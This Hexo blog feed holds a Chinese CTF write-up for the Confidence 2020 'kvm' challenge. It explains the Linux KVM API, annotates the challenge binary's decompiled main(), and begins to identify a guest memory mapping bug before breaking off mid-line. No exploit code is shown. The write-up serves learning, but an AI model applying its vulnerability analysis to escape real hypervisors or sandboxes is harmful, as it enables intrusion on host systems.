<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>C7</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://billyotry.github.io/"/>
  <updated>2020-10-05T02:14:40.486Z</updated>
  <id>https://billyotry.github.io/</id>
  
  <author>
    <name>C7</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[Confidence CTF]kvm</title>
    <link href="https://billyotry.github.io/2020/10/05/[Confidence%20CTF]kvm/"/>
    <id>https://billyotry.github.io/2020/10/05/[Confidence%20CTF]kvm/</id>
    <published>2020-10-05T02:09:56.234Z</published>
    <updated>2020-10-05T02:14:40.486Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Confidence2020-CTF-KVM"><a href="#Confidence2020-CTF-KVM" class="headerlink" title="Confidence2020 CTF KVM"></a>Confidence2020 CTF KVM</h1><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>参考链接：<a href="https://lwn.net/Articles/658511/" target="_blank" rel="noopener">https://lwn.net/Articles/658511/</a></p><h3 id="构建虚拟机"><a href="#构建虚拟机" class="headerlink" title="构建虚拟机"></a>构建虚拟机</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kvm = <span class="built_in">open</span>(<span class="string">"/dev/kvm"</span>, O_RDWR | O_CLOEXEC);</span><br></pre></td></tr></table></figure><p>我们需要对设备的读写访问来设置虚拟机，并且所有打开不是明确打算跨<code>exec</code>继承的，应使用 <code>O_CLOEXEC</code>。</p><h3 id="创建一个虚拟机"><a href="#创建一个虚拟机" class="headerlink" title="创建一个虚拟机"></a>创建一个虚拟机</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">vmfd = ioctl(kvm, KVM_CREATE_VM, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>现在创建一个虚拟机，它代表与模拟出来的系统所有相关联的内容，包括内存，一或多个CPU。</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">int ioctl(int fd, ind cmd, …)；</span><br></pre></td></tr></table></figure><p><strong>ioctl</strong> 是设备驱动程序中对设备I/O通道进行管理的函数。所谓对I/O通道进行管理，就是对设备的一些特性进行控制，例如串口的传输波特率、马达的转速等等。</p><ul><li><strong>fd</strong> 是用户程序打开设备时使用<strong>open函数返回的文件标示符</strong>。</li><li><strong>cmd</strong> 是用户程序对设备的控制命令。</li><li><strong>省略号</strong>是一些补充参数，一般最多一个，这个参数的有无和cmd的意义相关。</li></ul><h3 id="分配内存"><a href="#分配内存" class="headerlink" title="分配内存"></a>分配内存</h3><p>现在虚拟机需要分配一些内存。<strong>分配的内存就相当于虚拟机的物理内存</strong>，为了提高性能，我们不想捕获所有对于内存的访问并且模拟的返回它对应的地址；相反的是，当虚拟CPU试图访问内存的时候，CPU的硬件虚拟化会首先对尝试通过设置的内存页表来满足对内存的访问，如果失败了（由于虚拟机访问的是”物理”地址，而内存没有映射到该地址），那么内核就会使用KVM API 来处理这个访问，例如通过模拟内存映射的I/O设备或者产生一个错误。</p><p>对于我们的例子，我们分配了单独的页来存放我们的代码，使用mmap()直接获得初始化为0的页面对齐的内存</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mem = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>我们需要复制我们的机器代码到这个分配的空间内：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memcpy</span>(mem, code, <span class="keyword">sizeof</span>(code));</span><br></pre></td></tr></table></figure><p>然后告诉虚拟机它有足够大的4096个字节的内存：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_userspace_memory_region</span> <span class="title">region</span> = &#123;</span></span><br><span class="line">.slot = <span class="number">0</span>,</span><br><span class="line">.guest_phys_addr = <span class="number">0x1000</span>,</span><br><span class="line">.memory_size = <span class="number">0x1000</span>,</span><br><span class="line">.userspace_addr = (<span class="keyword">uint64_t</span>)mem,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ioctl(vmfd, KVM_SET_USER_MEMORY_REGION, &amp;region);</span><br></pre></td></tr></table></figure><ul><li><strong>slot</strong> 字段提供了一个整数索引，用于标识我们要移交给KVM的每个内存区域，再次使用相同的 slot 调用KVM_SET_USER_MEMORY_REGION将替换此映射，如果使用不同的 slot 就会创建一个新的单独的映射。</li><li><strong>guest_phys_addr</strong> 字段指定物理地址的基址。</li><li><strong>memory_size</strong> 字段指定我们要分配多大的内存。</li><li><strong>userspace_addr</strong> 字段指向我们使用mmap() 分配的后备内存，需要注意的是这个值总是64位的即使在32位平台上也是64位的，还有一点就是这里要求 mem 是页对齐的，这也就是为什么上面mmap的时候要分配一个页对齐的页。 </li></ul><h3 id="创建虚拟CPU"><a href="#创建虚拟CPU" class="headerlink" title="创建虚拟CPU"></a>创建虚拟CPU</h3><p>现在我们有一个VM并且VM中包含我们的代码，并且代码正等待运行，所以我们需要一个虚拟CPU来运行代码，KVM的虚拟CPU代表模拟CPU的状态，包括进程寄存器和其他的执行状态。</p><p>同样，KVM以文件描述符的形式为我们提供该VCPU的句柄：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">vcpufd = ioctl(vmfd, KVM_CREATE_VCPU, (<span class="keyword">unsigned</span> <span class="keyword">long</span>)<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>第三个参数 0 代表虚拟CPU的索引，具有多个CPU的VM将在此处分配一系列标识符，从0到系统特定的限制（可通过使用KVM_CHECK_EXTENSION检查KVM_CAP_MAX_VCPUS功能来获得）</p><h3 id="为CPU分配内存"><a href="#为CPU分配内存" class="headerlink" title="为CPU分配内存"></a>为CPU分配内存</h3><p>每个CPU都有一个关联的<code>struct kvm_run</code>的数据结构，用于CPU在内核和用户空间的信息交换，特别是，无论何时硬件虚拟化停止了，例如模拟的一些虚拟硬件，<code>kvm_run</code>结构将会包含为什么停止的信息，我们使用mmap映射它到用户内存空间内，但是首先我们需要知道分配多少内存，KVM通过KVM_GET_VCPU_MMAP_SIZE ioctl来告诉我们</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">mmap_size = ioctl(kvm, KVM_GET_VCPU_MMAP_SIZE, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>需要注意的是分配的内存通常都是大于<code>kvm_run</code>的大小的，因为内核还将使用该空间来存储<code>kvm_run</code>可能指向的其他瞬时结构。</p><p>现在我们已经知道了应该分配的size，我们可以使用mmap来映射这个<code>kvm_run</code>结构了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">run</span> = mmap(<span class="literal">NULL</span>, mmap_size, PROT_READ | PROT_WRITE, MAP_SHARED, vcpufd, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><h3 id="设置标准和特殊寄存器"><a href="#设置标准和特殊寄存器" class="headerlink" title="设置标准和特殊寄存器"></a>设置标准和特殊寄存器</h3><p>VCPU也包含进程的寄存器状态，分为两组寄存器，一组是标准寄存器，一组是特殊寄存器。这两种寄存器对印这两个特定体系的数据结构 <code>struct kvm_regs</code> 和 <code>struct kvm_sregs</code>。在x86上，标准寄存器包括通用寄存器以及指令指针和标志。”特殊”寄存器主要包括段寄存器和控制寄存器。</p><p>在我们开始运行我们的代码之前，我们应该要先初始化这些寄存器，对于特殊寄存器我们只需要更改 cs 段寄存器，cs 段寄存器的默认状态（以及初始指令指针）指向复位向量，位于内存顶部下方16个字节处，但我们希望 cs 改为指向0，<code>kvm_sregs</code>中的每个段都包含一个完整的段描述符；我们不需要更改各种标志或限制，但是我们将 cs 的 base 和 selector 归零，这两个字段共同确定段指向的内存地址。为了避免更改任何其他初始”特殊”寄存器状态，我们将其读出，更改 cs 并将其写回：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ioctl(vcpufd, KVM_GET_SREGS, &amp;sregs);</span><br><span class="line">sregs.cs.base = <span class="number">0</span>;</span><br><span class="line">sregs.cs.selector = <span class="number">0</span>;</span><br><span class="line">ioctl(vcpufd, KVM_SET_SREGS, &amp;sregs);</span><br></pre></td></tr></table></figure><p>对于标准寄存器，除了初始指令指针（指向代码0x1000，相对于 cs 指向0），加数（2和2）以及标志的初始状态（由x86架构指定为0x2；如果未设置此选项，则启动VM将会失败）：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kvm_regs</span> <span class="title">regs</span> = &#123;</span></span><br><span class="line">.rip = <span class="number">0x1000</span>,</span><br><span class="line">.rax = <span class="number">2</span>,</span><br><span class="line">.rbx = <span class="number">2</span>,</span><br><span class="line">.rflags = <span class="number">0x2</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">ioctl(vcpufd, KVM_SET_REGS, &amp;regs);</span><br></pre></td></tr></table></figure><h3 id="开始运行"><a href="#开始运行" class="headerlink" title="开始运行"></a>开始运行</h3><p>现在我们VM和VCPU以及初始化好了，内存映射也初始化好了，寄存器也都初始化好了，现在可以使用<code>kvm_run ioctl()</code>运行代码了，每当虚拟化停止时，这将成功返回，例如让我们模拟硬件，因此我们将其循环运行。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">ioctl(vcpufd, KVM_RUN, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">switch</span> (<span class="built_in">run</span>-&gt;exit_reason) &#123;</span><br><span class="line"><span class="comment">/* Handle exit */</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，<code>KVM_RUN</code>在当前进程的上下文运行VM，并且知道仿真停止后才返回。要运行多个VM，用户空间进程必须产生多个线程，并为不同线程中的不同虚拟CPU调用<code>KVM_RUN</code>。</p><h3 id="处理退出"><a href="#处理退出" class="headerlink" title="处理退出"></a>处理退出</h3><p>我们通过检测<code>run-&gt;exit_reason</code>来看为什么退出，<code>run-&gt;exit_reason</code>包含了数十个退出原因中的一个，对应与<code>kvm_run</code>中联合的不同分支。</p><p>对于这个简单的VM，我们只处理其中的几个，并将其他的<code>exit_reason</code>视为错误。</p><p>我们将暂停视为以及结束的标志</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> KVM_EXIT_HLT:</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"KVM_EXIT_HLT"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>为了让虚拟代码输出结果，我们在I/O端口0x3f8上模拟了一个串行端口。 run-&gt; io中的字段指示方向（输入或输出），大小（1、2或4），端口和值的数量。为了传递实际数据，内核使用在kvm_run结构之后映射的缓冲区，并且run-&gt; io.data_offset提供从该映射开始的偏移量。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> KVM_EXIT_IO:</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">run</span>-&gt;io.direction == KVM_EXIT_IO_OUT &amp;&amp;</span><br><span class="line"><span class="built_in">run</span>-&gt;io.<span class="built_in">size</span> == <span class="number">1</span> &amp;&amp;</span><br><span class="line"><span class="built_in">run</span>-&gt;io.port == <span class="number">0x3f8</span> &amp;&amp;</span><br><span class="line"><span class="built_in">run</span>-&gt;io.count == <span class="number">1</span>)</span><br><span class="line"><span class="built_in">putchar</span>(*(((<span class="keyword">char</span> *)<span class="built_in">run</span>) + <span class="built_in">run</span>-&gt;io.data_offset));</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">errx(<span class="number">1</span>, <span class="string">"unhandled KVM_EXIT_IO"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>为了简化调试设置和运行VM的过程，我们处理了一些常见的错误。特别是，KVM_EXIT_FAIL_ENTRY在更改VM的初始条件时经常显示；这表明底层硬件虚拟化机制（在这种情况下为VT）无法启动VM，因为初始条件不符合其要求。 （在其他原因中，如果标志寄存器未设置0x2位，或者段或任务切换寄存器的初始值未通过各种设置条件，则将发生此错误。）hardware_entry_failure_reason实际上并不能区分很多情况，因此，此类错误通常需要仔细阅读硬件文档。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> KVM_EXIT_FAIL_ENTRY:</span><br><span class="line">errx(<span class="number">1</span>, <span class="string">"KVM_EXIT_FAIL_ENTRY: hardware_entry_failure_reason = 0x%llx"</span>,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)<span class="built_in">run</span>-&gt;fail_entry.hardware_entry_failure_reason);</span><br></pre></td></tr></table></figure><p>当我们将所有这些放到示例代码中，对其进行构建并运行时，我们得到以下信息：</p><figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">$ ./kvmtest</span><br><span class="line"><span class="number">4</span></span><br><span class="line">KVM_EXIT_HLT</span><br></pre></td></tr></table></figure><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_kvm; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_create_kvm; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_set_user_memory; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_create_vcpu; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_set_regs; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_get_sregs; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> errno_set_sregs; <span class="comment">// eax</span></span><br><span class="line">  __u32 exit_reason; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> code_size; <span class="comment">// [rsp+Ch] [rbp-8274h]</span></span><br><span class="line">  <span class="keyword">int</span> kvmfd; <span class="comment">// [rsp+10h] [rbp-8270h]</span></span><br><span class="line">  <span class="keyword">int</span> vmfd; <span class="comment">// [rsp+14h] [rbp-826Ch]</span></span><br><span class="line">  <span class="keyword">int</span> vcpu; <span class="comment">// [rsp+18h] [rbp-8268h]</span></span><br><span class="line">  <span class="keyword">int</span> v16; <span class="comment">// [rsp+1Ch] [rbp-8264h]</span></span><br><span class="line">  <span class="keyword">char</span> *aligned_guest_mem; <span class="comment">// [rsp+20h] [rbp-8260h]</span></span><br><span class="line">  <span class="keyword">size_t</span> vcpu_mmap_size; <span class="comment">// [rsp+28h] [rbp-8258h]</span></span><br><span class="line">  kvm_run *run_mem; <span class="comment">// [rsp+30h] [rbp-8250h]</span></span><br><span class="line">  __int64 v20; <span class="comment">// [rsp+38h] [rbp-8248h]</span></span><br><span class="line">  __int64 v21; <span class="comment">// [rsp+40h] [rbp-8240h]</span></span><br><span class="line">  __int64 v22; <span class="comment">// [rsp+48h] [rbp-8238h]</span></span><br><span class="line">  __u64 v23; <span class="comment">// [rsp+50h] [rbp-8230h]</span></span><br><span class="line">  __u64 v24; <span class="comment">// [rsp+58h] [rbp-8228h]</span></span><br><span class="line">  __int64 v25; <span class="comment">// [rsp+60h] [rbp-8220h]</span></span><br><span class="line">  __int64 v26; <span class="comment">// [rsp+68h] [rbp-8218h]</span></span><br><span class="line">  __int64 v27; <span class="comment">// [rsp+70h] [rbp-8210h]</span></span><br><span class="line">  kvm_userspace_memory_region region; <span class="comment">// [rsp+80h] [rbp-8200h]</span></span><br><span class="line">  kvm_regs guest_regs; <span class="comment">// [rsp+A0h] [rbp-81E0h]</span></span><br><span class="line">  kvm_sregs guest_sregs; <span class="comment">// [rsp+130h] [rbp-8150h]</span></span><br><span class="line">  <span class="keyword">char</span> guest_mem[<span class="number">32776</span>]; <span class="comment">// [rsp+270h] [rbp-8010h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v32; <span class="comment">// [rsp+8278h] [rbp-8h]</span></span><br><span class="line">  __int64 savedregs; <span class="comment">// [rsp+8280h] [rbp+0h]</span></span><br><span class="line"></span><br><span class="line">  v32 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(guest_mem, <span class="number">0</span>, <span class="number">0x8000</span>uLL);</span><br><span class="line">  aligned_guest_mem = &amp;guest_mem[<span class="number">4096L</span>L - ((&amp;savedregs + <span class="number">0x7FF0</span>) &amp; <span class="number">0xFFF</span>)];<span class="comment">// </span></span><br><span class="line">                                                <span class="comment">// 经过动调发现savedregs+0x7ff0其实就是刚才memset里面s的位置</span></span><br><span class="line">                                                <span class="comment">// 然后((&amp;savedregs + 0x7ff0) &amp; 0xfff)就是取s的地址的低3位</span></span><br><span class="line">                                                <span class="comment">// 然后用0x1000减掉低三位得到一个值,这个值也就是地址加多少可以取到最近的整数</span></span><br><span class="line">                                                <span class="comment">// 所以说这里的功能是让aligned_guest_mem取整</span></span><br><span class="line">                                                <span class="comment">// 举个例子就是假如guest_mem的起始地址为0x7fffffff5c50</span></span><br><span class="line">                                                <span class="comment">// 让他取整就是取到0x7fffffff6000</span></span><br><span class="line">  code_size = <span class="number">-1</span>;</span><br><span class="line">  read_n(<span class="number">4L</span>L, &amp;code_size);                      <span class="comment">// 这里需要输入的字符转成对应的数字需要小于0x4000,所以说输入的就应该是\x00\x40\x00\x00</span></span><br><span class="line">  <span class="keyword">if</span> ( code_size &lt;= <span class="number">0x4000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    read_n(code_size, aligned_guest_mem);       <span class="comment">// 如果按照上面咱们输入的\x00\x40\x00\x00的话,咱们就需要输入0x4000个字符</span></span><br><span class="line">                                                <span class="comment">// 然后这些字符存储到aligned_guest_mem中</span></span><br><span class="line">    kvmfd = <span class="built_in">open</span>(<span class="string">"/dev/kvm"</span>, <span class="number">0x80002</span>);</span><br><span class="line">    <span class="keyword">if</span> ( kvmfd &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      errno_kvm = <span class="built_in">open</span>(<span class="string">"/dev/kvm"</span>, <span class="number">0x80002</span>);</span><br><span class="line">      kvmfd = errno_kvm;</span><br><span class="line">      err(errno_kvm, <span class="string">"fail line: %d"</span>, <span class="number">40L</span>L);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0xAE01 : KVM_CREATE_VM</span></span><br><span class="line">    vmfd = ioctl(kvmfd, <span class="number">0xAE01</span>uLL, <span class="number">0L</span>L);        <span class="comment">// 创建虚拟机，获取到虚拟机句柄</span></span><br><span class="line">    <span class="keyword">if</span> ( vmfd &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      errno_create_kvm = ioctl(kvmfd, <span class="number">0xAE01</span>uLL, <span class="number">0L</span>L);</span><br><span class="line">      vmfd = errno_create_kvm;</span><br><span class="line">      err(errno_create_kvm, <span class="string">"fail line: %d"</span>, <span class="number">43L</span>L);</span><br><span class="line">    &#125;</span><br><span class="line">    region.slot = <span class="number">0L</span>L;</span><br><span class="line">    region.guest_phys_addr = <span class="number">0L</span>L;</span><br><span class="line">    region.memory_size = <span class="number">0x8000</span>LL;</span><br><span class="line">    region.userspace_addr = aligned_guest_mem;</span><br><span class="line">    <span class="comment">// 0x4020ae46 : KVM_SET_USER_MEMORY_REGION</span></span><br><span class="line">    <span class="keyword">if</span> ( ioctl(vmfd, <span class="number">0x4020AE46</span>uLL, &amp;region) &lt; <span class="number">0</span> )<span class="comment">// 为虚拟机映射内存,还有其他的PCI,信号处理的初始化</span></span><br><span class="line">    &#123;</span><br><span class="line">      errno_set_user_memory = ioctl(vmfd, <span class="number">0x4020AE46</span>uLL, &amp;region);</span><br><span class="line">      err(errno_set_user_memory, <span class="string">"fail line: %d"</span>, <span class="number">52L</span>L);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0xae41 : KVM_CREATE_VCPU</span></span><br><span class="line">    vcpu = ioctl(vmfd, <span class="number">0xAE41</span>uLL, <span class="number">0L</span>L);         <span class="comment">// 创建vCPU</span></span><br><span class="line">    <span class="keyword">if</span> ( vcpu &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      errno_create_vcpu = ioctl(vmfd, <span class="number">0xAE41</span>uLL, <span class="number">0L</span>L);</span><br><span class="line">      vcpu = errno_create_vcpu;</span><br><span class="line">      err(errno_create_vcpu, <span class="string">"fail line: %d"</span>, <span class="number">55L</span>L);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0xAE04uLL : KVM_GET_VCPU_MMAP_SIZE</span></span><br><span class="line">    vcpu_mmap_size = ioctl(kvmfd, <span class="number">0xAE04</span>uLL, <span class="number">0L</span>L);<span class="comment">// 为vCPU分配内存空间</span></span><br><span class="line">    run_mem = mmap(<span class="number">0L</span>L, vcpu_mmap_size, <span class="number">3</span>, <span class="number">1</span>, vcpu, <span class="number">0L</span>L);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;guest_regs, <span class="number">0</span>, <span class="keyword">sizeof</span>(guest_regs));</span><br><span class="line">    guest_regs._rsp = <span class="number">0xFF0</span>LL;</span><br><span class="line">    guest_regs.rflags = <span class="number">2L</span>L;</span><br><span class="line">    <span class="comment">// 0x4090ae82 : KVM_SET_REGS</span></span><br><span class="line">    <span class="keyword">if</span> ( ioctl(vcpu, <span class="number">0x4090AE82</span>uLL, &amp;guest_regs) &lt; <span class="number">0</span> )<span class="comment">// 设置寄存器</span></span><br><span class="line">    &#123;</span><br><span class="line">      errno_set_regs = ioctl(vcpu, <span class="number">0x4090AE82</span>uLL, &amp;guest_regs);</span><br><span class="line">      err(errno_set_regs, <span class="string">"fail line: %d"</span>, <span class="number">66L</span>L);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0x8138AE83uLL : KVM_GET_SREGS</span></span><br><span class="line">    <span class="keyword">if</span> ( ioctl(vcpu, <span class="number">0x8138AE83</span>uLL, &amp;guest_sregs) &lt; <span class="number">0</span> )<span class="comment">// 获取特殊寄存器</span></span><br><span class="line">    &#123;</span><br><span class="line">      errno_get_sregs = ioctl(vcpu, <span class="number">0x8138AE83</span>uLL, &amp;guest_sregs);</span><br><span class="line">      err(errno_get_sregs, <span class="string">"fail line: %d"</span>, <span class="number">69L</span>L);</span><br><span class="line">    &#125;</span><br><span class="line">    v20 = <span class="number">0x7000</span>LL;</span><br><span class="line">    v21 = <span class="number">0x6000</span>LL;</span><br><span class="line">    v22 = <span class="number">0x5000</span>LL;</span><br><span class="line">    v23 = <span class="number">0x4000</span>LL;</span><br><span class="line">    *(aligned_guest_mem + <span class="number">0xE00</span>) = <span class="number">3L</span>L;         <span class="comment">// 设置4级页表,因为cr0对应的第31位的值为1,所以说开启了分页机制所以就需要设置4级页表</span></span><br><span class="line">                                                <span class="comment">// 这里看了一眼汇编代码这里虽然加的是0xe00,但是对应汇编代码加的还是0x7000</span></span><br><span class="line">    *&amp;aligned_guest_mem[v20 + <span class="number">8</span>] = <span class="number">0x1003</span>LL;</span><br><span class="line">    *&amp;aligned_guest_mem[v20 + <span class="number">16</span>] = <span class="number">0x2003</span>LL;</span><br><span class="line">    *&amp;aligned_guest_mem[v20 + <span class="number">24</span>] = <span class="number">0x3003</span>LL;</span><br><span class="line">    *&amp;aligned_guest_mem[v21] = v20 | <span class="number">3</span>;</span><br><span class="line">    *&amp;aligned_guest_mem[v22] = v21 | <span class="number">3</span>;</span><br><span class="line">    *&amp;aligned_guest_mem[v23] = v22 | <span class="number">3</span>;</span><br><span class="line">    v25 = <span class="number">0L</span>L;</span><br><span class="line">    v26 = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    v27 = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.cr3 = v23;</span><br><span class="line">    guest_sregs.cr4 = <span class="number">32L</span>L;</span><br><span class="line">    guest_sregs.cr0 = <span class="number">0x80050033</span>LL;</span><br><span class="line">    guest_sregs.efer = <span class="number">0x500</span>LL;</span><br><span class="line">    guest_sregs.cs.base = <span class="number">0L</span>L;</span><br><span class="line">    *&amp;guest_sregs.cs.limit = <span class="number">0x10B0008FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.cs.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.ss.base = <span class="number">0L</span>L;</span><br><span class="line">    *&amp;guest_sregs.ss.limit = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.ss.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.gs.base = <span class="number">0L</span>L;</span><br><span class="line">    *&amp;guest_sregs.gs.limit = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.gs.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.fs.base = <span class="number">0L</span>L;</span><br><span class="line">    *&amp;guest_sregs.fs.limit = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.fs.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.es.base = <span class="number">0L</span>L;</span><br><span class="line">    *&amp;guest_sregs.es.limit = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.es.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    guest_sregs.ds.base = <span class="number">0L</span>L;</span><br><span class="line">    *&amp;guest_sregs.ds.limit = <span class="number">0x1030010FFFFFFFF</span>LL;</span><br><span class="line">    *&amp;guest_sregs.ds.dpl = <span class="number">0x101010000</span>LL;</span><br><span class="line">    <span class="comment">// 0x4138AE84 : KVM_SET_SREGS</span></span><br><span class="line">    <span class="keyword">if</span> ( ioctl(vcpu, <span class="number">0x4138AE84</span>uLL, &amp;guest_sregs) &lt; <span class="number">0</span> )<span class="comment">// 设置特殊寄存器</span></span><br><span class="line">    &#123;</span><br><span class="line">      errno_set_sregs = ioctl(vcpu, <span class="number">0x4138AE84</span>uLL, &amp;guest_sregs);</span><br><span class="line">      err(errno_set_sregs, <span class="string">"fail line: %d"</span>, <span class="number">105L</span>L);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 0xae80 : KVM_RUN</span></span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ioctl(vcpu, <span class="number">0xAE80</span>uLL, <span class="number">0L</span>L);              <span class="comment">// 开始运行虚拟机</span></span><br><span class="line">      exit_reason = run_mem-&gt;exit_reason;</span><br><span class="line">      <span class="keyword">if</span> ( exit_reason == <span class="number">5</span> || exit_reason == <span class="number">8</span> )<span class="comment">// KVM_EXIT_HLT | KVM_EXIT_SHUTDOWN</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( exit_reason == <span class="number">2</span> )                   <span class="comment">// KVM_EXIT_IO</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( run_mem-&gt;io.direction == <span class="number">1</span> &amp;&amp; run_mem-&gt;io.port == <span class="number">0x3F8</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v16 = run_mem-&gt;io.<span class="built_in">size</span>;</span><br><span class="line">          v24 = run_mem-&gt;io.data_offset;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"%.*s"</span>, v16 * run_mem-&gt;ex.error_code, run_mem + v24);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n[loop] exit reason: %d\n"</span>, run_mem-&gt;exit_reason);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"\n[loop] goodbye!"</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[init] hold your horses"</span>);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>漏洞点：</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">memset</span>(guest_mem, <span class="number">0</span>, <span class="number">0x8000</span>uLL);</span><br><span class="line">aligned_guest_mem = &amp;guest_mem[<span class="number">4096L</span>L - ((&amp;savedregs + <span class="number">0x7FF0</span>) &amp; <span class="number">0xFFF</span>)];</span><br><span class="line"></span><br><span class="line">region.slot = <span class="number">0L</span>L;</span><br><span class="line">region.guest_phys_addr = <span class="number">0L</span>L;</span><br><span class="line">region.memory_size = <span class="number">0x8000</span>LL;</span><br><span class="line">region.userspace_addr = 